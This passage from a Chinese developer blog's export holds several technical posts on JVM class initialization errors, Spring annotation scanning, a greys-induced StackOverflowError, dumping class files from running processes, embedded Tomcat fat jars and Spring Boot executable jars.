Otherwise, the class or interface initialization method must have completed abruptly by throwing some exception E. If the class of E is not Error or one of its subclasses, then create a new instance of the class ExceptionInInitializerError with E as the argument, and use this object in place of E in the following step. 第一次尝试加载Version类时当第一次尝试加载时，hotspot InterpreterRuntime在解析invokestatic指令时，尝试加载org.hibernate.validator.internal.util.Version类，InstanceKlass的_init_state先是标记为being_initialized，然后当加载失败时，被标记为initialization_error。 对应Initialization的11步。 123456789101112131415161718192021222324// hotspot/src/share/vm/oops/instanceKlass.cpp// Step 10 and 11Handle e(THREAD, PENDING_EXCEPTION);CLEAR_PENDING_EXCEPTION;// JVMTI has already reported the pending exception// JVMTI internal flag reset is needed in order to report ExceptionInInitializerErrorJvmtiExport::clear_detected_exception((JavaThread*)THREAD);&#123; EXCEPTION_MARK; this_oop-&gt;set_initialization_state_and_notify(initialization_error, THREAD); CLEAR_PENDING_EXCEPTION; // ignore any exception thrown, class initialization error is thrown below // JVMTI has already reported the pending exception // JVMTI internal flag reset is needed in order to report ExceptionInInitializerError JvmtiExport::clear_detected_exception((JavaThread*)THREAD);&#125;DTRACE_CLASSINIT_PROBE_WAIT(error, InstanceKlass::cast(this_oop()), -1,wait);if (e-&gt;is_a(SystemDictionary::Error_klass())) &#123; THROW_OOP(e());&#125; else &#123; JavaCallArguments args(e); THROW_ARG(vmSymbols::java_lang_ExceptionInInitializerError(), vmSymbols::throwable_void_signature(), &amp;args);&#125; 第二次尝试加载Version类时当第二次尝试加载时，检查InstanceKlass的_init_state是initialization_error，则直接抛出NoClassDefFoundError: Could not initialize class. 对应Initialization的5步。 12345678910111213141516171819// hotspot/src/share/vm/oops/instanceKlass.cppvoid InstanceKlass::initialize_impl(instanceKlassHandle this_oop, TRAPS) &#123;// ... // Step 5 if (this_oop-&gt;is_in_error_state()) &#123; DTRACE_CLASSINIT_PROBE_WAIT(erroneous, InstanceKlass::cast(this_oop()), -1,wait); ResourceMark rm(THREAD); const char* desc = "Could not initialize class "; const char* className = this_oop-&gt;external_name(); size_t msglen = strlen(desc) + strlen(className) + 1; char* message = NEW_RESOURCE_ARRAY(char, msglen); if (NULL == message) &#123; // Out of memory: can't create detailed error message THROW_MSG(vmSymbols::java_lang_NoClassDefFoundError(), className); &#125; else &#123; jio_snprintf(message, msglen, "%s%s", desc, className); THROW_MSG(vmSymbols::java_lang_NoClassDefFoundError(), message); &#125; &#125; 总结 spring boot在BackgroundPreinitializer类里用一个独立的线程来加载validator，并吃掉了原始异常 第一次加载失败的类，在jvm里会被标记为initialization_error，再次加载时会直接抛出NoClassDefFoundError: Could not initialize class 当在代码里吞掉异常时要谨慎，否则排查问题带来很大的困难 http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.5]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>jvm</tag>
        <tag>ClassLoader</tag>
        <tag>NoClassDefFoundError</tag>
        <tag>hibernate</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正确实现用spring扫描自定义的annotation]]></title>
    <url>%2Fspring-scan-annotation%2F</url>
    <content type="text"><![CDATA[背景在使用spring时，有时候有会有一些自定义annotation的需求，比如一些Listener的回调函数。 比如： 123456@Servicepublic class MyService &#123; @MyListener public void onMessage(Message msg)&#123; &#125;&#125; 一开始的时候，我是在Spring的ContextRefreshedEvent事件里，通过context.getBeansWithAnnotation(Component.class) 来获取到所有的bean，然后再检查method是否有@MyListener的annotation。 后来发现这个方法有缺陷，当有一些spring bean的@Scope设置为session/request时，创建bean会失败。 参考：http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/#beans-factory-scopes 在网上搜索了一些资料，发现不少人都是用context.getBeansWithAnnotation(Component.class)，这样子来做的，但是这个方法并不对。 BeanPostProcessor接口后来看了下spring jms里的@JmsListener的实现，发现实现BeanPostProcessor接口才是最合理的办法。 123456789101112131415161718192021222324252627282930313233343536373839public interface BeanPostProcessor &#123; /** * Apply this BeanPostProcessor to the given new bean instance &lt;i&gt;before&lt;/i&gt; any bean * initialization callbacks (like InitializingBean's &#123;@code afterPropertiesSet&#125; * or a custom init-method). The bean will already be populated with property values. * The returned bean instance may be a wrapper around the original. * @param bean the new bean instance * @param beanName the name of the bean * @return the bean instance to use, either the original or a wrapped one; * if &#123;@code null&#125;, no subsequent BeanPostProcessors will be invoked * @throws org.springframework.beans.BeansException in case of errors * @see org.springframework.beans.factory.InitializingBean#afterPropertiesSet */ Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException; /** * Apply this BeanPostProcessor to the given new bean instance &lt;i&gt;after&lt;/i&gt; any bean * initialization callbacks (like InitializingBean's &#123;@code afterPropertiesSet&#125; * or a custom init-method). The bean will already be populated with property values. * The returned bean instance may be a wrapper around the original. * &lt;p&gt;In case of a FactoryBean, this callback will be invoked for both the FactoryBean * instance and the objects created by the FactoryBean (as of Spring 2.0). The * post-processor can decide whether to apply to either the FactoryBean or created * objects or both through corresponding &#123;@code bean instanceof FactoryBean&#125; checks. * &lt;p&gt;This callback will also be invoked after a short-circuiting triggered by a * &#123;@link InstantiationAwareBeanPostProcessor#postProcessBeforeInstantiation&#125; method, * in contrast to all other BeanPostProcessor callbacks. * @param bean the new bean instance * @param beanName the name of the bean * @return the bean instance to use, either the original or a wrapped one; * if &#123;@code null&#125;, no subsequent BeanPostProcessors will be invoked * @throws org.springframework.beans.BeansException in case of errors * @see org.springframework.beans.factory.InitializingBean#afterPropertiesSet * @see org.springframework.beans.factory.FactoryBean */ Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException;&#125; 所有的bean在创建完之后，都会回调postProcessAfterInitialization函数，这时就可以确定bean是已经创建好的了。 所以扫描自定义的annotation的代码大概是这个样子的： 123456789101112131415161718public class MyListenerProcessor implements BeanPostProcessor &#123; @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123; return bean; &#125; @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123; Method[] methods = ReflectionUtils.getAllDeclaredMethods(bean.getClass()); if (methods != null) &#123; for (Method method : methods) &#123; MyListener myListener = AnnotationUtils.findAnnotation(method, MyListener.class); // process &#125; &#125; return bean; &#125;&#125; SmartInitializingSingleton 接口看spring jms的代码时，发现SmartInitializingSingleton 这个接口也比较有意思。 就是当所有的singleton的bean都初始化完了之后才会回调这个接口。不过要注意是 4.1 之后才出现的接口。 123456789101112131415public interface SmartInitializingSingleton &#123; /** * Invoked right at the end of the singleton pre-instantiation phase, * with a guarantee that all regular singleton beans have been created * already. &#123;@link ListableBeanFactory#getBeansOfType&#125; calls within * this method won't trigger accidental side effects during bootstrap. * &lt;p&gt;&lt;b&gt;NOTE:&lt;/b&gt; This callback won't be triggered for singleton beans * lazily initialized on demand after &#123;@link BeanFactory&#125; bootstrap, * and not for any other bean scope either. Carefully use it for beans * with the intended bootstrap semantics only. */ void afterSingletonsInstantiated();&#125; https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/beans/factory/SmartInitializingSingleton.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详细分析罕见的ClassCircularityError异常导致的StackOverflowError]]></title>
    <url>%2Fjava-classcircularityerror%2F</url>
    <content type="text"><![CDATA[先打一个广告。 greys是一个很不错的java诊断工具：https://github.com/oldmanpushcart/greys-anatomy 最近尝试用greys来实时统计jvm里的异常生成数量，在增强Throwable时，发现应用会抛出StackOverflowError。下面记录详细的分析过程。 在真正分析之前，先介绍JVM对反射方法调用的优化和greys的工作原理。 JVM对反射方法调用的优化在JVM里对于反射方法调用Method.invoke，默认情况下，是通过NativeMethodAccessorImpl来调用到的。 调用栈如下： 1234NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method] NativeMethodAccessorImpl.invoke(Object, Object[]) line: 62 DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 497 当经过16次方法调用之后，NativeMethodAccessorImpl 会用MethodAccessorGenerator 动态生成一个MethodAccessorImpl（即下面的GeneratedMethodAccessor1） ，然后再设置到 DelegatingMethodAccessorImpl 里。然后调用栈就变成这个样子： 123GeneratedMethodAccessor1.invoke(Object, Object[]) line: not available DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 497 这个动态生成的GeneratedMethodAccessor1是如何加载到ClassLoader里的？实际上是通过 Unsafe.defineClass 来define，然后再调用 ClassLoader.loadClass(String) 来加载到的。 123AgentLauncher$1(ClassLoader).loadClass(String) line: 357 Unsafe.defineClass(String, byte[], int, int, ClassLoader, ProtectionDomain) line: not available [native method] ClassDefiner.defineClass(String, byte[], int, int, ClassLoader) line: 63 更多反射调用优化的细节参考：http://rednaxelafx.iteye.com/blog/548536 简单总结下： jvm会对method反射调用优化 运行时动态生成反射调用代码，再define到classloader里 define到classloader时，会调用ClassLoader.loadClass(String) greys的工作原理使用greys可以在运行时，对方法调用进行一些watch, monitor等的动作。那么这个是怎么实现的呢？ 简单来说，是通过运行时修改字节码来实现的。比如下面这个函数： 12345class xxx &#123; public String abc(Student s) &#123; return s.getName(); &#125;&#125; 被greys修改过后，变为 1234567891011Spy.ON_BEFORE_METHOD.invoke(null, new Integer(0), xxx2.getClass().getClassLoader(), "xxx", "abc", "(LStudent;)Ljava/lang/String;", xxx2, &#123;student&#125;);try &#123; void s; String string = s.getName(); Spy.ON_RETURN_METHOD.invoke(null, string); return string;&#125;catch (Throwable v1) &#123; Spy.ON_THROWS_METHOD.invoke(null, v1); throw v1;&#125; 可以看到，greys在原来的method里插入很多钩子，所以greys可以获取到method被调用的参数，返回值等信息。 当使用greys对java.lang.Throwable来增强时，会抛出StackOverflowError测试代码：12345678910public class ExceptionTest &#123; public static void main(String[] args) throws Exception &#123; for (int i = 0; i &lt; 100000; i++) &#123; RuntimeException exception = new RuntimeException(&quot;&quot;); System.err.println(exception); Thread.sleep(1000); &#125; &#125;&#125; 在命令行里attach到测试代码进程之后，在greys console里执行 12options unsafe truemonitor -c 1 java.lang.Throwable * 当用greys增强java.lang.Throwable之后，经过16秒之后，就会抛出StackOverflowError。 具体的异常栈很长，这里只贴出重点部分： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Thread [main] (Suspended (exception StackOverflowError)) ClassLoader.checkCreateClassLoader() line: 272 ... ClassCircularityError(Throwable).&lt;init&gt;(String) line: 264 ClassCircularityError(Error).&lt;init&gt;(String) line: 70 ClassCircularityError(LinkageError).&lt;init&gt;(String) line: 55 ClassCircularityError.&lt;init&gt;(String) line: 53 Unsafe.defineClass(String, byte[], int, int, ClassLoader, ProtectionDomain) line: not available [native method] ClassDefiner.defineClass(String, byte[], int, int, ClassLoader) line: 63 MethodAccessorGenerator$1.run() line: 399 MethodAccessorGenerator$1.run() line: 394 AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [native method] MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int, boolean, boolean, Class&lt;?&gt;) line: 393 MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int) line: 75 NativeMethodAccessorImpl.invoke(Object, Object[]) line: 53 DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 497 ClassCircularityError(Throwable).&lt;init&gt;(String) line: 264 ClassCircularityError(Error).&lt;init&gt;(String) line: 70 ClassCircularityError(LinkageError).&lt;init&gt;(String) line: 55 ClassCircularityError.&lt;init&gt;(String) line: 53 Unsafe.defineClass(String, byte[], int, int, ClassLoader, ProtectionDomain) line: not available [native method] ClassDefiner.defineClass(String, byte[], int, int, ClassLoader) line: 63 MethodAccessorGenerator$1.run() line: 399 MethodAccessorGenerator$1.run() line: 394 AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [native method] MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int, boolean, boolean, Class&lt;?&gt;) line: 393 MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int) line: 75 NativeMethodAccessorImpl.invoke(Object, Object[]) line: 53 DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 497 ClassNotFoundException(Throwable).&lt;init&gt;(String, Throwable) line: 286 ClassNotFoundException(Exception).&lt;init&gt;(String, Throwable) line: 84 ClassNotFoundException(ReflectiveOperationException).&lt;init&gt;(String, Throwable) line: 75 ClassNotFoundException.&lt;init&gt;(String) line: 82 AgentLauncher$1(URLClassLoader).findClass(String) line: 381 AgentLauncher$1.loadClass(String, boolean) line: 55 AgentLauncher$1(ClassLoader).loadClass(String) line: 357 Unsafe.defineClass(String, byte[], int, int, ClassLoader, ProtectionDomain) line: not available [native method] ClassDefiner.defineClass(String, byte[], int, int, ClassLoader) line: 63 MethodAccessorGenerator$1.run() line: 399 MethodAccessorGenerator$1.run() line: 394 AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [native method] MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int, boolean, boolean, Class&lt;?&gt;) line: 393 MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int) line: 75 NativeMethodAccessorImpl.invoke(Object, Object[]) line: 53 DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 497 RuntimeException(Throwable).&lt;init&gt;(String) line: 264 RuntimeException(Exception).&lt;init&gt;(String) line: 66 RuntimeException.&lt;init&gt;(String) line: 62 ExceptionTest.main(String[]) line: 15 从异常栈可以看出，先出现了一个ClassNotFoundException，然后大量的ClassCircularityError，最终导致StackOverflowError。 下面具体分析原因。 被增强过后的Throwable的代码当monitor -c 1 java.lang.Throwable *命令执行之后，Throwable的代码实际上变为这个样子： 123456789101112public class Throwable &#123; public Throwable() &#123; Spy.ON_BEFORE_METHOD.invoke(...); try &#123; // Throwable &lt;init&gt; &#125; catch (Throwable v1) &#123; Spy.ON_THROWS_METHOD.invoke(null, v1); throw v1; &#125; &#125;&#125; 这个Spy.ON_BEFORE_METHOD.invoke 是一个反射调用，那么当它被调用16次之后，jvm会生成优化的代码。从最开始的异常栈可以看到这些信息： 1234567891011121314Unsafe.defineClass(String, byte[], int, int, ClassLoader, ProtectionDomain) line: not available [native method] ClassDefiner.defineClass(String, byte[], int, int, ClassLoader) line: 63 MethodAccessorGenerator$1.run() line: 399 MethodAccessorGenerator$1.run() line: 394 AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [native method] MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int, boolean, boolean, Class&lt;?&gt;) line: 393 MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], int) line: 75 NativeMethodAccessorImpl.invoke(Object, Object[]) line: 53 DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 497 RuntimeException(Throwable).&lt;init&gt;(String) line: 264 RuntimeException(Exception).&lt;init&gt;(String) line: 66 RuntimeException.&lt;init&gt;(String) line: 62 ExceptionTest.main(String[]) line: 15 这时，生成的反射调用优化类名字是sun/reflect/GeneratedMethodAccessor1。 ClassNotFoundException 怎么产生的接着，代码抛出了一个ClassNotFoundException，这个ClassNotFoundException来自AgentLauncher$1(URLClassLoader)。这是AgentLauncher 里自定义的一个URLClassLoader。 这个自定义ClassLoader的逻辑很简单，优先从自己查找class，如果找不到则从parent里查找。这是一个常见的重写ClassLoader的逻辑。 123456789101112131415161718192021classLoader = new URLClassLoader(new URL[]&#123;new URL("file:" + agentJar)&#125;) &#123; @Override protected synchronized Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; final Class&lt;?&gt; loadedClass = findLoadedClass(name); if (loadedClass != null) &#123; return loadedClass; &#125; try &#123; Class&lt;?&gt; aClass = findClass(name); if (resolve) &#123; resolveClass(aClass); &#125; return aClass; &#125; catch (Exception e) &#123; return super.loadClass(name, resolve); &#125; &#125;&#125;; 这个ClassNotFoundException的具体信息是sun.reflect.MethodAccessorImpl。实际上是MethodAccessorGenerator在生成反射调用代码里要用到的，所以需要加载到ClassLoader里。因此自定义的URLClassLoader在findClass时抛出了一个ClassNotFoundException。 ClassCircularityError是怎么产生的抛出的ClassNotFoundException是Throwable的一个子类，所以也会调用Throwable的构造函数，然后需要调用到Spy.ON_BEFORE_METHOD.invoke 。 注意，这时Spy.ON_BEFORE_METHOD.invoke的反射调用代码已经生成了，但是还没有置入到ClassLoader里，也没有放到DelegatingMethodAccessorImpl里。所以这时仍然调用的是NativeMethodAccessorImpl，然后再次生成反射调用类，name是sun/reflect/GeneratedMethodAccessor2。 生成GeneratedMethodAccessor2之后， 会调用Unsafe.define来define这个class。这里抛出了ClassCircularityError。 为什么会抛出ClassCircularityError因为Unsafe.defineClass 是native实现，所以需要查看hotspot源码才能知道具体的细节。 SystemDictionary是jvm里加载的所有类的总管，所以在defineClass，会调用到这个函数 12345// systemDictionary.cppKlass* SystemDictionary::resolve_instance_class_or_null(Symbol* name, Handle class_loader, Handle protection_domain, TRAPS) &#123; 然后，在这里面会有一个判断循环的方法。防止循环依赖。如果是发现了循环，则会抛出ClassCircularityError。 123456789101112// systemDictionary.cpp // only need check_seen_thread once, not on each loop // 6341374 java/lang/Instrument with -Xcomp if (oldprobe-&gt;check_seen_thread(THREAD, PlaceholderTable::LOAD_INSTANCE)) &#123; throw_circularity_error = true; &#125;... if (throw_circularity_error) &#123; ResourceMark rm(THREAD); THROW_MSG_NULL(vmSymbols::java_lang_ClassCircularityError(), child_name-&gt;as_C_string()); &#125; 这个循环检测是怎么工作的呢？ 实际上是把线程放到一个queue里，然后判断这个queue里的保存的前一个线程是不是一样的，如果是一样的，则会认为出现循环了。 123456789101112131415161718192021222324252627282930// placeholders.cpp bool check_seen_thread(Thread* thread, PlaceholderTable::classloadAction action) &#123; assert_lock_strong(SystemDictionary_lock); SeenThread* threadQ = actionToQueue(action); SeenThread* seen = threadQ; while (seen) &#123; if (thread == seen-&gt;thread()) &#123; return true; &#125; seen = seen-&gt;next(); &#125; return false; &#125; SeenThread* actionToQueue(PlaceholderTable::classloadAction action) &#123; SeenThread* queuehead; switch (action) &#123; case PlaceholderTable::LOAD_INSTANCE: queuehead = _loadInstanceThreadQ; break; case PlaceholderTable::LOAD_SUPER: queuehead = _superThreadQ; break; case PlaceholderTable::DEFINE_CLASS: queuehead = _defineThreadQ; break; default: Unimplemented(); &#125; return queuehead; &#125; 就这个例子实际情况来说，就是同一个thread里，在defineClass时，再次defineClass，这样子就出现了循环。所以抛出了一个ClassCircularityError。 StackOverflowError怎么产生的OK，搞明白ClassCircularityError这个异常是怎么产生的之后，回到原来的流程看下。 这个ClassCircularityError也是Throwable的一个子类，那么它也需要初始化，然后调用Spy.ON_BEFORE_METHOD.invoke …… 然后，接下来就生成一个sun/reflect/GeneratedMethodAccessor3 ，然后会被defindClass，然后就会检测到循环，然后再次抛出ClassCircularityError。 就这样子，最终一直到StackOverflowError 完整的异常产生流程 Throwable的构造函数被增强之后，需要调用Spy.ON_BEFORE_METHOD.invoke Spy.ON_BEFORE_METHOD.invoke经过16次调用之后，jvm会生成反射调用优化代码 反射调用优化类sun/reflect/GeneratedMethodAccessor1需要被自定义的ClassLoader加载 自定义的ClassLoader重写了loadClass函数，抛出了一个ClassNotFoundException ClassNotFoundException在构造时，调用了Throwable的构造函数，然后调用了Spy.ON_BEFORE_METHOD.invoke Spy.ON_BEFORE_METHOD.invoke 生成反射调用优化代码：sun/reflect/GeneratedMethodAccessor2 Unsafe在defineClass sun/reflect/GeneratedMethodAccessor2 时，检测到循环，抛出了ClassCircularityError ClassCircularityError在构造时，调用了Throwable的构造函数，然后调用了Spy.ON_BEFORE_METHOD.invoke 反射调用优化类sun/reflect/GeneratedMethodAccessor3 在defineClass时，检测到循环，抛出了ClassCircularityError …… 不断抛出ClassCircularityError，最终导致StackOverflowError 总结这个问题的根源是在Throwable的构造函数里抛出了异常，这样子明显无解。 为了避免这个问题，需要保证增强过后的Throwable的构造函数里不能抛出任何异常。然而因为jvm的反射调用优化，导致ClassLoader在loadClass时抛出了异常。所以要避免在加载jvm生成反射优化类时抛出异常。 修改过后的自定义URLClassLoader代码： 12345678910111213141516171819202122232425classLoader = new URLClassLoader(new URL[]&#123;new URL("file:" + agentJar)&#125;) &#123; @Override protected synchronized Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; final Class&lt;?&gt; loadedClass = findLoadedClass(name); if (loadedClass != null) &#123; return loadedClass; &#125; // 优先从parent（SystemClassLoader）里加载系统类，避免抛出ClassNotFoundException if(name != null &amp;&amp; (name.startsWith("sun.") || name.startsWith("java."))) &#123; return super.loadClass(name, resolve); &#125; try &#123; Class&lt;?&gt; aClass = findClass(name); if (resolve) &#123; resolveClass(aClass); &#125; return aClass; &#125; catch (Exception e) &#123; // ignore &#125; return super.loadClass(name, resolve); &#125;&#125;;]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从java进程里dump出类的class文件的小工具--dumpclass]]></title>
    <url>%2Fdumpclass%2F</url>
    <content type="text"><![CDATA[Serviceability Agent想要查看一些被增强过的类的字节码，或者一些AOP框架的生成类，就需要dump出运行时的java进程里的字节码。 从运行的java进程里dump出运行中的类的class文件的方法，所知道的有两种 用agent attatch 到进程，然后利用Instrumentation和ClassFileTransformer就可以获取 到类的字节码了。 使用sd-jdi.jar里的工具 sd-jdi.jar 里自带的的sun.jvm.hotspot.tools.jcore.ClassDump就可以把类的class内容dump到文件里。 ClassDump里可以设置两个System properties： sun.jvm.hotspot.tools.jcore.filter Filter的类名 sun.jvm.hotspot.tools.jcore.outputDir 输出的目录 sd-jdi.jar 里有一个sun.jvm.hotspot.tools.jcore.PackageNameFilter，可以指定Dump哪些包里的类。PackageNameFilter里有一个System property可以指定过滤哪些包：sun.jvm.hotspot.tools.jcore.PackageNameFilter.pkgList。 所以可以通过这样子的命令来使用： 1sudo java -classpath &quot;$JAVA_HOME/lib/sa-jdi.jar&quot; -Dsun.jvm.hotspot.tools.jcore.filter=sun.jvm.hotspot.tools.jcore.PackageNameFilter -Dsun.jvm.hotspot.tools.jcore.PackageNameFilter.pkgList=com.test sun.jvm.hotspot.tools.jcore.ClassDump 显然，这个使用起来太麻烦了，而且不能应对复杂的场景。 dumpclassdumpclass这个小工具做了一些增强，更加方便地使用。 支持? *的匹配 支持多个ClassLoader加载了同名类的情况。 比如多个classloader加载了多份的logger，如果不做区分，则dump出来时会被覆盖掉，也分析不出问题。 dumpclass可以在maven仓库里下载到：http://search.maven.org/#search%7Cga%7C1%7Cdumpclass dumpclass的用法很简单，比如： 1234567Usage: java -jar dumpclass.jar &lt;pid&gt; &lt;pattern&gt; [outputDir] &lt;--classLoaderPrefix&gt;Example: java -jar dumpclass.jar 4345 *StringUtils java -jar dumpclass.jar 4345 *StringUtils /tmp java -jar dumpclass.jar 4345 *StringUtils /tmp --classLoaderPrefix 对于多个ClassLoader的情况，可以使用--classLoaderPrefix，这样子在输出.class文件时，会为每一个ClasssLoader创建一个目录，比如：sun.jvm.hotspot.oops.Instance@955d26b8。并且会在目录下放一个classLoader.text文件，里面是ClassLoader.toString()的内容，方便查看具体ClassLoader是什么。 源码和文档： https://github.com/hengyunabc/dumpclass HSDB在sa-jdi.jar里，还有一个图形化的工具HSDB，也可以用来查看运行的的字节码。 1sudo java -classpath "$JAVA_HOME/lib/sa-jdi.jar" sun.jvm.hotspot.HSDB 参考http://rednaxelafx.iteye.com/blog/727938https://docs.oracle.com/javase/7/docs/api/java/lang/instrument/ClassFileTransformer.htmlhttp://openjdk.java.net/groups/hotspot/docs/Serviceability.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应用内置embeded tomcat，并打包为fat jar的解决方案]]></title>
    <url>%2Fembeded-tomcat-fat-jar%2F</url>
    <content type="text"><![CDATA[需求大量的微服务框架引起了一大波embeded tomcat，executable fat jar的潮流。显然spring boot是最出色的解决方案，但是spring boot有两个不足的地方： 不支持配置web.xml文件，对于旧应用迁移不方便 一些配置在web.xml里配置起来很直观，放到代码里配置就难搞清楚顺序了。比如一些filter的顺序关系。 spring boot的方案依赖spring，对于一些轻量级的应用不想引入依赖 基于这些考虑，这里提出一个基于embeded tomcat本身的解决方案。 代码地址https://github.com/hengyunabc/executable-embeded-tomcat-sample 支持特性： 支持加载传统的web.xml配置 支持打包为fat jar方式运行 支持在IDE里直接运行 旧应用迁移步聚旧应用迁移非常的简单 在pom.xml里增加embeded tomcat的依赖 把应用原来的src/main/webapp/WEB-INF 移动到 src/main/resources/WEB-INF下，把在src/main/webapp下面的所有文件移动到 src/main/META-INF/resources目录下 写一个main函数，把tomcat启动起来 非常的简单，完全支持旧应用的所有功能，不用做任何的代码改造。 工作原理web.xml的读取传统的Tomcat有两个目录，一个是baseDir，对应tomcat本身的目录，下面有conf, bin这些文件夹。一个是webapp的docBase目录，比如webapps/ROOT 这个目录。 docBase只能是一个目录，或者是一个.war结尾的文件（实际对应不解压war包运行的方式）。 tomcat里的一个webapp对应有一个Context，Context里有一个WebResourceRoot，应用里的资源都是从WebResourceRoot 里加载的。tomcat在初始化Context时，会把docBase目录加到WebResourceRoot里。 tomcat在加载应用的web.xml里，是通过ServletContext来加载的，而ServletContext实际上是通过WebResourceRoot来获取到资源的。 所以简而言之，需要在tomcat启动之前，web.xml放到Context的WebResourceRoot，这样子tomcat就可以读取到web.xml里。 静态资源的处理在Servlet 3.0规范里，应用可以把静态的资源放在jar包里的/META-INF/classes目录，或者在WEB-INF/classes/META-INF/resources目录下。 所以，采取了把资源文件全都放到src/main/META-INF/resources目录的做法，这样子有天然符合Servlet的规范，而且在打包时，自然地打包到fat jar里。 Fat jar的支持Fat jar的支持是通过spring-boot-maven-plugin来实现的，它提供了把应用打包为fat jar，并启动的能力。具体原理可以参考另外一篇博客：http://blog.csdn.net/hengyunabc/article/details/50120001 当然，也可以用其它的方式把依赖都打包到一起，比如maven-assembly-plugin/jar-with-dependencies ，但不推荐，毕竟spring boot的方案很优雅。 其它http://home.apache.org/~markt/presentations/2010-11-04-Embedding-Tomcat.pdf 官方的Embedded Tomcat文档 http://www.oracle.com/webfolder/technetwork/tutorials/obe/java/basic_app_embedded_tomcat/basic_app-tomcat-embedded.html oracle的技术文档里的一个方案，但是这个方案太简单了，不支持在IDE里启动，不支持加载web.xml文件。 https://github.com/kui/executable-war-sample 这个把依赖都打包进war包里，然后在初始化tomcat里，直接把这个war做为docBase。这样子可以加载到web.xml。但是有一个严重的安全问题，因为应用的.class文件直接在war的根目录下，而不是在/WEB-INF/classes目录下，所以可以直接通过http访问到应用的.class文件，即攻击者可以直接拿到应用的代码来逆向分析。这个方案并不推荐使用。 实际上spring boot应用以一个war包直接运行时，也是有这个安全问题的。只是spring boot泄露的只是spring boot loader的.class文件。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>tomcat</tag>
        <tag>fatjar</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring boot executable jar/war 原理]]></title>
    <url>%2Fspring-boot-executable-jar%2F</url>
    <content type="text"><![CDATA[spring boot executable jar/warspring boot里其实不仅可以直接以 java -jar demo.jar的方式启动，还可以把jar/war变为一个可以执行的脚本来启动，比如./demo.jar。 把这个executable jar/war 链接到/etc/init.d下面，还可以变为linux下的一个service。 只要在spring boot maven plugin里配置： 1234567&lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;executable&gt;true&lt;/executable&gt; &lt;/configuration&gt;&lt;/plugin&gt; 这样子打包出来的jar/war就是可执行的。更多详细的内容可以参考官方的文档。 http://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#deployment-install zip格式里的magic number生成的jar/war实际上是一个zip格式的文件，这个zip格式文件为什么可以在shell下面直接执行？ 研究了下zip文件的格式。zip文件是由entry组成的，而每一个entry开头都有一个4个字节的magic number： 123Local file header signature = 0x04034b50 (read as a little-endian number)即 PK\003\004 参考：https://en.wikipedia.org/wiki/Zip_(file_format) zip处理软件是读取到magic number才开始处理。所以在linux/unix下面，可以把一个bash文件直接写在一个zip文件的开头，这样子会被认为是一个bash script。 而zip处理软件在读取这个文件时，仍然可以正确地处理。 比如spring boot生成的executable jar/war，的开头是： 12345678910#!/bin/bash## . ____ _ __ _ _# /\\ / ___'_ __ _ _(_)_ __ __ _ \ \ \ \# ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \# \\/ ___)| |_)| | | | | || (_| | ) ) ) )# ' |____| .__|_| |_|_| |_\__, | / / / /# =========|_|==============|___/=/_/_/_/# :: Spring Boot Startup Script ::# 在script内容结尾，可以看到zip entry的magic number: 12exit 0PK^C^D spring boot的launch.script实际上spring boot maven 